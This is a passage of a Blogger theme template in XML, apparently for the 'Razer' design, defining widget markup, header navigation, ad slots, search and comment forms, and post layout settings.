      </div>
    </b:includable>
    <b:includable id='emailPostIcon'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='facebookShare'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='footerBylines'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='googlePlusShare'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='headerByline'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='linkShare'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='otherSharingButton'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='platformShare'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='postAuthor'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='postCommentsLink'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='postJumpLink' var='post'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='postLabels'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='postLocation'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='postReactions'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='postShareButtons'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='postTimestamp'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='sharingButton'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='sharingButtonContent'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='sharingButtons'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='sharingButtonsMenu'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='sharingPlatformIcon'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='snippetedPostByline'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='snippetedPostContent'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='snippetedPostThumbnail'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='snippetedPostTitle'><b:comment>Replaced</b:comment></b:includable>
    <b:includable id='snippetedPosts'><b:comment>Replaced</b:comment></b:includable>
  </b:defaultmarkup>
  <b:defaultmarkup type='ContactForm'>
    <b:includable id='main' var='this'>
      <b:include name='widget-title'/>
      <b:include name='content'/>
    </b:includable>
    <b:includable id='content'>
      <b:include name='contact-form-content'/>
    </b:includable>       
  </b:defaultmarkup>
  <b:defaultmarkup type='Label'>
    <b:includable id='main' var='this'>
      <b:include name='widget-title'/>
      <b:include name='content'/>
    </b:includable>
    <b:includable id='content'>
      <div class='widget-content'>
        <b:class expr:name='data:this.display + &quot;-label&quot;'/>
        <b:include cond='data:this.display == &quot;list&quot;' name='list'/>
        <b:include cond='data:this.display == &quot;cloud&quot;' name='cloud'/>
      </div>
    </b:includable>
    <b:includable id='list'>
      <ul class='list-style'>
        <b:loop values='data:labels' var='label'>
          <li><a class='label-name' expr:href='data:label.url'><data:label.name/><b:if cond='data:this.showFreqNumbers'><b:class name='has-count'/><span class='label-count count-style'>(<data:label.count/>)</span></b:if></a></li>
        </b:loop>
      </ul>
    </b:includable>
    <b:includable id='cloud'>
      <ul class='cloud-style'>
        <b:loop values='data:labels' var='label'>
          <li><a class='label-name btn' expr:href='data:label.url'><data:label.name/><b:if cond='data:this.showFreqNumbers'><b:class name='has-count'/><span class='label-count count-style'>(<data:label.count/>)</span></b:if></a></li>
        </b:loop>
      </ul>
    </b:includable>
  </b:defaultmarkup>
  <b:defaultmarkup type='FollowByEmail'>
    <b:includable id='main' var='this'>
      <b:include name='content'/>
    </b:includable>
    <b:includable id='content'>
      <div class='widget-content' expr:data-shortcode='data:title'>
        <h3 class='follow-by-email-title'><data:messages.subscribeToThisBlog/></h3>
        <p class='follow-by-email-text excerpt'><data:messages.getEmailNotifications/></p>
        <div class='follow-by-email-form'>
          <form action='https://feedburner.google.com/fb/a/mailverify' expr:onsubmit='&quot;window.open(\&quot;https://feedburner.google.com/fb/a/mailverify?uri=&quot; + data:feedPath + &quot;\&quot;, \&quot;popupwindow\&quot;, \&quot;scrollbars=yes,width=550,height=520\&quot;); return true&quot;' method='post' target='popupwindow'>
            <input autocomplete='off' class='follow-by-email-address' expr:aria-label='data:messages.emailAddress' expr:ariby='data:messages.emailAddress' expr:placeholder='data:messages.emailAddress' name='email' type='email'/>
            <input class='follow-by-email-submit btn' expr:value='data:messages.subscribe' type='submit'/>
            <input expr:value='data:feedPath' name='uri' type='hidden'/>
            <input expr:value='data:blog.localeUnderscoreDelimited' name='loc' type='hidden'/>
          </form>
        </div>
      </div>
    </b:includable>
  </b:defaultmarkup> 
  <b:defaultmarkup type='Image'>
    <b:includable id='main' var='this'>
      <b:include name='widget-title'/>
      <b:include name='content'/>
    </b:includable>
    <b:includable id='content'>
      <b:include name='image-content'/>
    </b:includable>
  </b:defaultmarkup> 
  <b:defaultmarkup type='BlogArchive'>
    <b:includable id='main' var='this'>
      <b:include name='widget-title'/>
      <b:include name='content'/>
    </b:includable>
    <b:includable id='content'>
      <div class='widget-content'>
        <b:class name='archive-list'/>
        <b:include cond='data:this.style in {&quot;FLAT&quot;, &quot;MENU&quot;, &quot;HIERARCHY&quot;}' name='flat'/>
      </div>
    </b:includable>
    <b:includable id='flat'>
      <ul class='list-style'>
        <b:loop values='data:data' var='i'>
          <li><a class='archive-name' expr:href='data:i.url'><data:i.name/><b:if cond='data:i.post-count'><b:class name='has-count'/><span class='archive-count count-style'>(<data:i.post-count/>)</span></b:if></a></li>
        </b:loop>
      </ul>
    </b:includable>
  </b:defaultmarkup>
  <b:defaultmarkup type='PageList'>
    <b:includable id='main'>
      <b:include name='widget-title'/>
      <b:include name='content'/>
    </b:includable>
    <b:includable id='content'>
      <div class='widget-content'>
        <b:include name='pageList'/>
      </div>
    </b:includable>
    <b:includable id='overflowButton'>
      <b:include name='verticalMoreIcon'/>
    </b:includable>
    <b:includable id='overflowablePageList'>
      <div class='overflowable-container'>
        <div class='overflowable-contents'>
          <div class='container'>
            <b:with value='true' var='overflow'>
              <b:with value='&quot;tabs&quot;' var='pageListClass'>
                <b:include name='pageList'/>
              </b:with>
            </b:with>
          </div>
        </div>
        <div class='overflow-button hidden'>
          <b:include name='overflowButton'/>
        </div>
      </div>
    </b:includable>
    <b:includable id='pageLink'>
      <li>
        <b:class cond='data:overflow' name='overflowable-item'/>
        <b:class cond='data:link.isCurrentPage' name='selected'/>
        <a expr:href='data:link.href'><data:link.title/></a>
      </li>
    </b:includable>
    <b:includable id='pageList'>
      <ul class='list-style'>
        <b:class cond='data:pageListClass' expr:name='data:pageListClass'/>
        <b:loop values='data:links' var='link'>
          <b:include name='pageLink'/>
        </b:loop>
      </ul>
    </b:includable>
  </b:defaultmarkup>
  <b:defaultmarkup type='BlogSearch'>
    <b:includable id='main'>
      <b:include name='content'/>
    </b:includable>
    <b:includable id='content'>
      <b:include name='searchForm'/>
    </b:includable>
    <b:includable id='searchForm'>
      <div class='widget-content search-widget'>
        <form class='search-form' expr:action='data:blog.searchUrl'>
          <b:attr cond='not data:view.isPreview' name='target' value='_top'/>
          <b:include name='urlParamsAsFormInput'/>
          <input autocomplete='off' class='search-input' expr:ariby='data:title' expr:placeholder='data:title' name='q' type='search' value=''/>
          <b:include name='searchSubmit'/>
        </form>
      </div>
    </b:includable>
    <b:includable id='searchSubmit'>
      <button class='search-action btn' type='submit' value=''/>
    </b:includable>
  </b:defaultmarkup>
  <b:defaultmarkup type='Profile'>
    <b:includable id='main' var='this'>
      <b:include name='widget-title'/>
      <b:include name='content'/>
    </b:includable>
    <b:includable id='authorProfileImage'>
      <img class='profile-img' expr:alt='data:messages.myPhoto' expr:src='resizeImage(data:authorPhoto.image, 45, &quot;1:1&quot;)'/>
    </b:includable>
    <b:includable id='defaultProfileImage'>
      <img class='profile-img' expr:alt='data:messages.myPhoto' src='https://4.bp.blogspot.com/-oSjP8F09qxo/Wy1J9dp7b0I/AAAAAAAACF0/ggcRfLCFQ9s2SSaeL9BFSE2wyTYzQaTyQCK4BGAYYCw/w45-h45-p-k-no-nu/avatar.jpg'/>
    </b:includable>
    <b:includable id='userProfileInfo'>
      <div class='profile-info'>
        <dl class='profile-datablock'>
          <b:include name='userProfileData'/>
        </dl>
        <b:include name='viewProfileLink'/>
      </div>
    </b:includable>
    <b:includable id='teamProfileLink'>
      <b:include name='profileImage'/>
      <div class='profile-info'>
        <a class='profile-name' expr:href='data:userUrl' rel='nofollow' target='_blank'><data:display-name/></a>
        <a class='profile-link' expr:href='data:userUrl' rel='nofollow' target='_blank'><data:messages.showMore/></a>
      </div>
    </b:includable>
    <b:includable id='userProfile'>
      <b:include name='profileImage'/>
      <div class='profile-info'>
        <a class='profile-name' expr:href='data:userUrl' rel='nofollow' target='_blank'><data:displayname/></a>
        <a class='profile-link' expr:href='data:userUrl' rel='nofollow' target='_blank'><data:messages.showMore/></a>
      </div>
    </b:includable>
  </b:defaultmarkup>
</b:defaultmarkups>
</head>
<body>
<b:include name='theme-body-class'/>
<b:if cond='data:view.isLayoutMode or (data:widgets any w =&gt; w.sectionId == &quot;ify-panel&quot;)'>
  <!-- Theme Options -->
  <div id='theme-options' style='display:none'>
    <b:section class='ify-panel' id='ify-panel' maxwidgets='3' name='Theme Options' showaddelement='no'>
      <b:widget id='TextList100' locked='true' title='Facebook SDK' type='TextList' visible='true'>
        <b:includable id='main' var='this'>
      <b:include name='widget-title'/>
      <b:include name='content'/>
    </b:includable>
        <b:includable id='content'>
      <b:include name='textlist-content'/>
    </b:includable>
      </b:widget>
      <b:widget id='Image100' locked='true' title='No Thumbnail Image' type='Image' visible='true'>
        <b:widget-settings>
          <b:widget-setting name='displayUrl'>https://4.bp.blogspot.com/-eALXtf-Ljts/WrQYAbzcPUI/AAAAAAAABjY/vptx-N2H46oFbiCqbSe2JgVSlHhyl0MwQCK4BGAYYCw/s72-c/nth-ify.png</b:widget-setting>
          <b:widget-setting name='displayHeight'>72</b:widget-setting>
          <b:widget-setting name='sectionWidth'>150</b:widget-setting>
          <b:widget-setting name='shrinkToFit'>false</b:widget-setting>
          <b:widget-setting name='displayWidth'>72</b:widget-setting>
          <b:widget-setting name='link'/>
          <b:widget-setting name='caption'/>
        </b:widget-settings>
        <b:includable id='main' var='this'>
      <b:include name='widget-title'/>
      <b:include name='content'/>
    </b:includable>
        <b:includable id='content'>
      <b:include name='image-content'/>
    </b:includable>
      </b:widget>
      <b:widget id='HTML100' locked='true' title='JSON Variables' type='HTML' visible='true'>
        <b:widget-settings>
          <b:widget-setting name='content'/>
        </b:widget-settings>
        <b:includable id='main'>
      <b:include name='html-content'/>
    </b:includable>
      </b:widget>
    </b:section>
  </div>
</b:if>
<!-- Outer Wrapper -->
<div id='outer-wrapper'>
  <!-- Header Wrapper -->
  <header id='header-wrapper'>
    <b:if cond='data:view.isLayoutMode or (data:widgets any w =&gt; w.sectionId in [&quot;topbar-menu&quot;,&quot;topbar-social&quot;])'>
      <nav class='topbar-wrap flex-center'>
        <b:class cond='data:skin.vars.topbar_bg == data:skin.vars.header_bg' name='has-border'/>
        <div class='container row-x1'>
          <div class='topbar-items'>
            <b:section class='topbar-menu' id='topbar-menu' maxwidgets='1' name='Topbar Menu' showaddelement='yes'>
              <b:widget id='LinkList105' locked='true' title='' type='LinkList' visible='true'>
                <b:widget-settings>
                  <b:widget-setting name='sorting'>NONE</b:widget-setting>
                  <b:widget-setting name='text-1'>About Us</b:widget-setting>
                  <b:widget-setting name='link-1'>https://www.mrjaz.com/</b:widget-setting>
                  <b:widget-setting name='text-0'>Home</b:widget-setting>
                  <b:widget-setting name='link-2'>https://www.mrjaz.com/</b:widget-setting>
                  <b:widget-setting name='link-0'>/</b:widget-setting>
                  <b:widget-setting name='text-2'>Contact Us</b:widget-setting>
                </b:widget-settings>
                <b:includable id='main' var='this'>
      <b:include name='widget-title'/>
      <b:include name='content'/>
    </b:includable>
                <b:includable id='content'>
      <b:include name='linklist-content'/>
    </b:includable>
              </b:widget>
            </b:section>
            <b:section class='topbar-social' id='topbar-social' maxwidgets='1' name='Topbar Icons' showaddelement='yes'>
              <b:widget id='LinkList106' locked='true' title='' type='LinkList' visible='true'>
                <b:widget-settings>
                  <b:widget-setting name='link-3'>https://www.mrjaz.com/</b:widget-setting>
                  <b:widget-setting name='sorting'>NONE</b:widget-setting>
                  <b:widget-setting name='text-1'>twitter</b:widget-setting>
                  <b:widget-setting name='link-1'>https://www.am2z.com/</b:widget-setting>
                  <b:widget-setting name='text-0'>facebook</b:widget-setting>
                  <b:widget-setting name='link-2'>https://www.mrjaz.com/</b:widget-setting>
                  <b:widget-setting name='text-3'>rss</b:widget-setting>
                  <b:widget-setting name='link-0'>https://www.am2z.com/</b:widget-setting>
                  <b:widget-setting name='text-2'>youtube</b:widget-setting>
                </b:widget-settings>
                <b:includable id='main' var='this'>
      <b:include name='widget-title'/>
      <b:include name='content'/>
    </b:includable>
                <b:includable id='content'>
      <b:include name='linklist-content'/>
    </b:includable>
              </b:widget>
            </b:section>
          </div>
        </div>
      </nav>
    </b:if>
    <div class='main-header'>
      <div class='header-inner'>
        <div class='header-header flex-center'>
          <div class='container row-x1'>
            <div class='header-items'>
              <div class='flex-left'>
                <b:section class='main-logo' id='main-logo' maxwidgets='1' name='Header Logo' showaddelement='no'>
                  <b:widget id='Header1' locked='true' title='Razer Blogger Template (Header)' type='Header' visible='true'>
                    <b:widget-settings>
                      <b:widget-setting name='displayUrl'>http://2.bp.blogspot.com/-hx3abQfDEmM/YK3xhz4T9-I/AAAAAAAAK0o/w163JQbSe84E098hb6jp54DVDWwodFUtgCK4BGAYYCw/s1600/Razer-logo-New.png</b:widget-setting>
                      <b:widget-setting name='displayHeight'>48</b:widget-setting>
                      <b:widget-setting name='sectionWidth'>150</b:widget-setting>
                      <b:widget-setting name='useImage'>true</b:widget-setting>
                      <b:widget-setting name='shrinkToFit'>false</b:widget-setting>
                      <b:widget-setting name='imagePlacement'>REPLACE</b:widget-setting>
                      <b:widget-setting name='displayWidth'>257</b:widget-setting>
                    </b:widget-settings>
                    <b:includable id='main' var='this'>
      <b:tag class='mobile-menu-toggle' href='javascript:;' name='a' role='button' title='Menu'/>
      <b:include cond='data:imagePlacement in {&quot;REPLACE&quot;, &quot;BEFORE_DESCRIPTION&quot;}' name='image'/>
      <b:include cond='data:imagePlacement == &quot;BEHIND&quot;' name='title'/>
    </b:includable>
                    <b:includable id='behindImageStyle'><b:comment>Replaced</b:comment></b:includable>
                    <b:includable id='description'><b:comment>Replaced</b:comment></b:includable>
                    <b:includable id='image'>
      <a class='logo-img' expr:href='data:blog.homepageUrl.canonical'>
        <img expr:alt='data:blog.title.escaped' expr:data-height='data:height' expr:data-width='data:width' expr:src='data:image' expr:title='data:blog.title.escaped'/>
        <b:if cond='data:view.isMultipleItems'><b:if cond='data:widget.sectionId == &quot;main-logo&quot;'><h1 id='h1-off'><data:title/></h1></b:if></b:if>
      </a>
    </b:includable>
                    <b:includable id='title'>
      <b:tag class='blog-title' cond='data:view.isMultipleItems' name='h1'>
        <b:tag class='blog-title' cond='!data:view.isMultipleItems' name='span'>
          <b:tag expr:href='data:blog.homepageUrl.canonical' name='a'>
            <data:title/>
          </b:tag>
        </b:tag>
      </b:tag>
    </b:includable>
                  </b:widget>
                </b:section>
                <b:section class='razer-pro-main-nav' id='razer-pro-main-nav' maxwidgets='1' name='Header Menu' showaddelement='no'>
                  <b:widget id='LinkList101' locked='true' title='' type='LinkList' visible='true'>
                    <b:widget-settings>
                      <b:widget-setting name='text-10'>Documentation</b:widget-setting>
                      <b:widget-setting name='sorting'>NONE</b:widget-setting>
                      <b:widget-setting name='link-1'>https://www.mrjaz.com/</b:widget-setting>
                      <b:widget-setting name='link-13'>https://www.am2z.com/</b:widget-setting>
                      <b:widget-setting name='link-2'>https://www.mrjaz.com/</b:widget-setting>
                      <b:widget-setting name='link-12'>https://www.am2z.com/</b:widget-setting>
                      <b:widget-setting name='link-0'>{homepage}</b:widget-setting>
                      <b:widget-setting name='link-11'>https://www.mrjaz.com/</b:widget-setting>
                      <b:widget-setting name='link-10'>https://www.am2z.com/</b:widget-setting>
                      <b:widget-setting name='text-9'>Mega Menu</b:widget-setting>
                      <b:widget-setting name='link-9'>{getContent} $label={recent}</b:widget-setting>
                      <b:widget-setting name='text-8'>_Error Page</b:widget-setting>
                      <b:widget-setting name='link-7'>https://www.mrjaz.com/</b:widget-setting>
                      <b:widget-setting name='link-8'>https://www.am2z.com/</b:widget-setting>
                      <b:widget-setting name='link-5'>https://www.mrjaz.com/</b:widget-setting>
                      <b:widget-setting name='link-6'>https://www.am2z.com/</b:widget-setting>
                      <b:widget-setting name='link-3'>https://www.mrjaz.com/</b:widget-setting>
                      <b:widget-setting name='link-4'>https://www.am2z.com/</b:widget-setting>
                      <b:widget-setting name='text-1'>Features</b:widget-setting>
                      <b:widget-setting name='text-0'>Home</b:widget-setting>
                      <b:widget-setting name='text-3'>__DropDown 1</b:widget-setting>
                      <b:widget-setting name='text-2'>_Multi DropDown</b:widget-setting>
                      <b:widget-setting name='text-5'>__DropDown 3</b:widget-setting>
                      <b:widget-setting name='text-4'>__DropDown 2</b:widget-setting>
                      <b:widget-setting name='text-7'>_Sitemap</b:widget-setting>
                      <b:widget-setting name='text-6'>_Shortcodes</b:widget-setting>
                      <b:widget-setting name='text-11'>__Web Doc</b:widget-setting>
                      <b:widget-setting name='text-12'>__Video Doc</b:widget-setting>
                      <b:widget-setting name='text-13'>Download This Template</b:widget-setting>
                    </b:widget-settings>
                    <b:includable id='main' var='this'>
      <b:include name='widget-title'/>
      <b:include name='content'/>
    </b:includable>
                    <b:includable id='content'>
      <b:include name='linklist-content'/>
    </b:includable>
                  </b:widget>
                </b:section>
              </div>
              <div class='flex-right'>
                <div class='main-toggle-wrap'>
                  <b:tag class='main-toggle-style darkmode-toggle' cond='data:skin.vars.darkmode == &quot;0px&quot; and (data:skin.vars.userdarkmode == &quot;1px&quot;)' href='javascript:;' name='a' role='button'/>
                  <b:tag class='main-toggle-style show-search' expr:title='data:messages.search' href='javascript:;' name='a' role='button'/>
                </div>
              </div>
              <div id='main-search-wrap'>
                <div class='main-search'>
                  <form class='search-form' expr:action='data:blog.searchUrl' role='search'>
                    <input autocomplete='off' class='search-input' expr:placeholder='data:messages.search' name='q' type='search' value=''/>
                  </form>
                  <b:tag class='main-toggle-style hide-search' expr:title='data:messages.search' href='javascript:;' name='a' role='button'/>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </header>
  <b:if cond='data:view.isLayoutMode or (data:view.isHomepage and (data:widgets any w =&gt; w.sectionId == &quot;featured&quot;))'>
    <!-- Featured Posts -->
    <div class='flex-center' id='featured-wrap'>
      <b:section class='featured container row-x1' id='featured' maxwidgets='1' name='Featured Posts' showaddelement='yes'>
        <b:widget id='HTML2' locked='false' title='Featured Widget' type='HTML' visible='true'>
          <b:widget-settings>
            <b:widget-setting name='content'>{getContent} $label={recent}</b:widget-setting>
          </b:widget-settings>
          <b:includable id='main'>
      <b:include name='html-content'/>
    </b:includable>
        </b:widget>
      </b:section>
    </div>
  </b:if>
  <b:if cond='data:view.isLayoutMode or (data:view.isHomepage and (data:widgets any w =&gt; w.sectionId == &quot;header-ads&quot;)) or (data:view.isPost and (data:skin.vars.headerad_onpost == &quot;1px&quot;) and (data:widgets any w =&gt; w.sectionId == &quot;header-ads&quot;))'>
     <!-- Header Ads -->
    <div class='flex-center' id='header-ads-wrap'>
      <b:section class='header-ads container row-x1' id='header-ads' maxwidgets='1' name='Header ADS' showaddelement='yes'>
        <b:widget id='HTML1' locked='false' title='Ads' type='HTML' visible='true'>
          <b:widget-settings>
            <b:widget-setting name='content'><![CDATA[<a class="ads-here" href="https://www.mrjaz.com/">Responsive Advertisement</a>]]></b:widget-setting>
          </b:widget-settings>
          <b:includable id='main'>
      <b:include name='html-content'/>
    </b:includable>
        </b:widget>
      </b:section>
    </div>
  </b:if>
  <!-- Content Wrapper -->
  <div class='flex-center' id='content-wrapper'>
    <div class='container row-x1'>
      <!-- Main Wrapper -->
      <main id='main-wrapper'>
        <b:class cond='data:widgets any w =&gt; w.sectionId in [&quot;main-ads-2&quot;,&quot;content-section-2&quot;]' name='has-m'/>
        <b:class cond='data:widgets any w =&gt; w.sectionId == &quot;main-ads-2&quot;' name='has-ad-m'/>
        <b:section class='content-section' cond='data:view.isLayoutMode or (data:view.isHomepage and (data:widgets any w =&gt; w.sectionId == &quot;content-section-1&quot;))' id='content-section-1' name='Content Section 1' showaddelement='yes'>
          <b:widget id='HTML18' locked='false' title='Laptops' type='HTML' visible='true'>
            <b:widget-settings>
              <b:widget-setting name='content'>{getContent} $results={5} $label={recent} $type={block1}</b:widget-setting>
            </b:widget-settings>
            <b:includable id='main'>
      <b:include name='html-content'/>
    </b:includable>
          </b:widget>
          <b:widget id='HTML13' locked='false' title='Videos' type='HTML' visible='true'>
            <b:widget-settings>
              <b:widget-setting name='content'>{getContent} $results={3} $label={recent} $type={video}</b:widget-setting>
            </b:widget-settings>
            <b:includable id='main'>
      <b:include name='html-content'/>
    </b:includable>
          </b:widget>
          <b:widget id='HTML12' locked='false' title='Apple' type='HTML' visible='true'>
            <b:widget-settings>
              <b:widget-setting name='content'>{getContent} $results={4} $label={recent} $type={colLeft}</b:widget-setting>
            </b:widget-settings>
            <b:includable id='main'>
      <b:include name='html-content'/>
    </b:includable>
          </b:widget>
          <b:widget id='HTML10' locked='false' title='Android' type='HTML' visible='true'>
            <b:widget-settings>
              <b:widget-setting name='content'>{getContent} $results={4} $label={recent} $type={colRight}</b:widget-setting>
            </b:widget-settings>
            <b:includable id='main'>
      <b:include name='html-content'/>
    </b:includable>
          </b:widget>
        </b:section>
        <b:section class='main-ads' cond='data:view.isLayoutMode or (data:view.isHomepage and (data:widgets any w =&gt; w.sectionId == &quot;main-ads&quot;))' id='main-ads' maxwidgets='1' name='Main Ads 1' showaddelement='yes'>
          <b:widget id='HTML7' locked='false' title='' type='HTML' visible='true'>
            <b:widget-settings>
              <b:widget-setting name='content'><![CDATA[<a class="ads-here" href="https://www.am2z.com/">Responsive Advertisement</a>]]></b:widget-setting>
            </b:widget-settings>
            <b:includable id='main'>
      <b:include name='html-content'/>
    </b:includable>
          </b:widget>
        </b:section>
        <b:section class='main' id='main' maxwidgets='1' name='Main Posts' showaddelement='yes'>
          <b:widget id='Blog1' locked='true' title='Blog Posts' type='Blog' version='2' visible='true'>
            <b:widget-settings>
              <b:widget-setting name='commentLabel'>$type={blogger}</b:widget-setting>
              <b:widget-setting name='showShareButtons'>true</b:widget-setting>
              <b:widget-setting name='authorLabel'>by</b:widget-setting>
              <b:widget-setting name='disableGooglePlusShare'>true</b:widget-setting>
              <b:widget-setting name='style.unittype'>TextAndImage</b:widget-setting>
              <b:widget-setting name='timestampLabel'>-</b:widget-setting>
              <b:widget-setting name='reactionsLabel'/>
              <b:widget-setting name='showAuthorProfile'>true</b:widget-setting>
              <b:widget-setting name='style.layout'>1x1</b:widget-setting>
              <b:widget-setting name='showLocation'>false</b:widget-setting>
              <b:widget-setting name='showTimestamp'>true</b:widget-setting>
              <b:widget-setting name='postsPerAd'>1</b:widget-setting>
              <b:widget-setting name='style.bordercolor'>#000000</b:widget-setting>
              <b:widget-setting name='backlinksLabel'/>
              <b:widget-setting name='showDateHeader'>false</b:widget-setting>
              <b:widget-setting name='style.textcolor'>#0072ff</b:widget-setting>
              <b:widget-setting name='showCommentLink'>true</b:widget-setting>
              <b:widget-setting name='style.urlcolor'>#76767a</b:widget-setting>
              <b:widget-setting name='showAuthor'>true</b:widget-setting>
              <b:widget-setting name='style.linkcolor'>#f3f8fb</b:widget-setting>
              <b:widget-setting name='style.bgcolor'>#000000</b:widget-setting>
              <b:widget-setting name='showLabels'>true</b:widget-setting>
              <b:widget-setting name='postLabelsLabel'>Tags:</b:widget-setting>
              <b:widget-setting name='showBacklinks'>false</b:widget-setting>
              <b:widget-setting name='showInlineAds'>false</b:widget-setting>
              <b:widget-setting name='showReactions'>false</b:widget-setting>
            </b:widget-settings>
            <b:includable id='main' var='this'>
      <b:tag class='blog-posts-wrap' cond='data:view.isMultipleItems' name='div'>
        <b:include cond='data:view.isHomepage' name='blogPostsTitle'/>
        <b:include name='searchMessage'/>
        <div class='blog-posts hfeed'>
          <b:class cond='data:view.isMultipleItems' name='index-post-wrap'/>
          <b:class cond='data:view.isSingleItem' name='item-post-wrap'/>
          <b:loop index='i' values='data:posts' var='post'>
            <b:include data='post' name='postCommentsAndAd'/>
          </b:loop>
        </div>
        <b:include cond='data:view.isMultipleItems' name='ajaxPagination'/>
      </b:tag>
      <b:include name='feedLinks'/>
      <b:include name='exportBlogContent'/>
    </b:includable>
            <b:includable id='aboutPostAuthor'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='addComments'>
      <a expr:href='data:post.commentsUrl' expr:onclick='data:post.commentsUrlOnclick'><data:messages.postAComment/></a>
    </b:includable>
            <b:includable id='ajaxPagination'>
      <!-- Ajax Pagination on Index -->
      <div class='blog-pager' id='blog-pager'>
        <b:class cond='data:posts.empty' name='no-blog-posts'/>
        <b:if cond='data:olderPageUrl'>
          <a class='blog-pager-older-link load-more btn' expr:data-load='data:olderPageUrl.canonical' href='javascript:;' id='razer-pro-load-more-link'><b:include data='{ message: &quot;loadMorePosts&quot; }' name='theme-custom-lang'/></a>
          <span class='loading'><div class='loader'/></span>
          <span class='no-more load-more btn'><b:include data='{ message: &quot;noMorePosts&quot; }' name='theme-custom-lang'/></span>
          <b:else/>
          <span class='no-more load-more btn show'><b:include data='{ message: &quot;noMorePosts&quot; }' name='theme-custom-lang'/></span>
        </b:if>
      </div>
    </b:includable>
            <b:includable id='backLinks' var='post'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='blogPostsTitle'>
      <b:if cond='data:blog.jumpLinkMessage != &quot;hide&quot;'>
        <div class='title-wrap bp-title'><h3 class='title'><data:blog.jumpLinkMessage/></h3><a class='wt-l' href='/search'><data:messages.viewAll/></a></div>
      </b:if>
    </b:includable>
            <b:includable id='blogThisShare'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='bylineByName' var='byline'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='bylineRegion' var='regionItems'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='commentAuthorAvatar'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='commentDeleteIcon' var='comment'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='commentForm' var='post'>
      <div class='comment-form'>
        <a name='comment-form'/>
        <b:include data='post' name='commentFormIframeSrc'/>
        <iframe allowtransparency='allowtransparency' class='blogger-iframe-colorize blogger-comment-from-post' frameborder='0' height='90px' id='comment-editor' name='comment-editor' src='' width='100%'/>
        <data:post.cmtfpIframe/>
        <script type='text/javascript'>
          BLOG_CMT_createIframe(&#39;<data:post.appRpcRelayPath/>&#39;);
        </script>
      </div>
    </b:includable>
            <b:includable id='commentFormIframeSrc' var='post'>
      <a expr:href='data:post.commentFormIframeSrc + &quot;&amp;skin=soho&quot;' id='comment-editor-src' rel='noopener noreferrer' title='Comment Form Link'/>
    </b:includable>
            <b:includable id='commentItem' var='comment'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='commentList' var='comments'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='commentPicker' var='post'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='comments' var='post'>
      <a name='comments'/>
      <b:include name='commentsTitle'/>
      <section class='comments threaded' expr:data-embed='data:post.embedCommentForm' expr:data-num-comments='data:post.numberOfComments' id='comments'>
        <b:class expr:name='data:post.numberOfComments != 0 ? &quot;has-comments&quot; : &quot;no-comments&quot;'/>
        <b:if cond='data:post.allowNewComments'>
          <b:if cond='data:this.messages.blogComment'><p class='comments-message excerpt'><data:this.messages.blogComment/></p></b:if>
          <b:else/>
          <b:if cond='data:post.noNewCommentsText and (data:post.numberOfComments == 0)'><p class='comments-message no-new-comments excerpt'><data:post.noNewCommentsText/><em>*</em></p></b:if>
        </b:if>
        <b:if cond='data:post.embedCommentForm'>
          <b:if cond='data:post.numberOfComments != 0'>
            <div class='comments-content'>
              <div id='comment-holder'>
                <data:post.commentHtml/>
              </div>
            </div>
          </b:if>
          <b:if cond='data:post.allowNewComments'>
            <b:include data='post' name='commentForm'/>
          </b:if>
          <b:if cond='!data:post.allowNewComments'><b:if cond='data:post.noNewCommentsText and (data:post.numberOfComments != 0)'><p class='comments-message no-new-comments excerpt'><data:post.noNewCommentsText/><em>*</em></p></b:if></b:if>
          <b:else/>
          <p class='comments-message excerpt'>Please Select Embedded Mode To Show The Comment System.<em>*</em></p>
        </b:if>
      </section>
    </b:includable>
            <b:includable id='commentsLink'>
  <a class='comment-link' expr:href='data:post.commentsUrl' expr:onclick='data:post.commentsUrlOnclick'>
    <b:if cond='data:post.numberOfComments &gt; 0'>
      <b:message name='messages.numberOfComments'>
        <b:param expr:value='data:post.numberOfComments' name='numComments'/>
      </b:message>
    <b:else/>
      <data:messages.postAComment/>
    </b:if>
  </a>
</b:includable>
            <b:includable id='commentsLinkIframe'>
  <!-- G+ comments, no longer available. The includable is retained for backwards-compatibility. -->
</b:includable>
            <b:includable id='commentsTitle'>
      <!-- Comments Title -->
      <div class='title-wrap comments-title'><h3 class='title'><b:if cond='data:post.numberOfComments != 0'><data:post.numberOfComments/> <data:messages.comments/><b:else/><data:messages.postAComment/></b:if></h3></div>
    </b:includable>
            <b:includable id='defaultAdUnit'>
      <ins class='adsbygoogle' data-ad-format='fluid' data-ad-layout-key='-gu-1b+bf-87-nl' data-full-width-responsive='false' expr:data-ad-client='data:adClientId ?: data:blog.adsenseClientId' expr:data-ad-host='data:blog.adsenseHostId' expr:data-analytics-uacct='data:blog.analyticsAccountNumber' expr:style='data:style ?: &quot;display: block;&quot;' style='display:block'/>
